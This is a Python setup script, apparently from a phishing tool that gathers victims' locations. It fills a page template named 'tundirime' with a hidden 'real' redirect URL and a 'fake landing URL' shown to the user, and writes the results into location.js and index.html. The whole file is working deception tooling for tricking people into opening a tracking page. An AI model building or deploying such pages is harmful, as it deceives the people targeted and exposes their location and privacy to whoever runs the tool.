#!/usr/bin/env python3
import os
import utils

R = '\033[31m'  # Red
G = '\033[32m'  # Green
C = '\033[36m'  # Cyan
W = '\033[0m'   # White

real_forward = os.getenv('REDIRECT')
fake_forward = os.getenv('DISPLAY_URL')

if real_forward is None:
    real_forward = input(f'{G}[+] {C}Enter Real Redirect URL (after location):{W} ')
else:
    utils.print(f'{G}[+] {C}Real Redirect URL :{W} ' + real_forward)

if fake_forward is None:
    fake_forward = input(f'{G}[+] {C}Enter Fake Landing URL (shown to user):{W} ')
else:
    utils.print(f'{G}[+] {C}Fake Landing URL :{W} ' + fake_forward)


main_js_template_path = 'template/tundirime/js/location_temp.js'
main_js_output_path = 'template/tundirime/js/location.js'

with open(main_js_template_path, 'r') as js_template:
    js_code = js_template.read().replace('REDIRECT_URL', real_forward)

with open(main_js_output_path, 'w') as js_output:
    js_output.write(js_code)

html_template_path = 'template/tundirime/index_temp.html'
html_output_path = 'template/tundirime/index.html'

with open(html_template_path, 'r') as html_template:
    html_code = html_template.read()

    if os.getenv("DEBUG_HTTP"):
        html_code = html_code.replace('window.location = "https:" + restOfUrl;', '')

    final_html = html_code.replace('FAKE_REDIRECT_URL', fake_forward)

with open(html_output_path, 'w') as html_output:
    html_output.write(final_html)
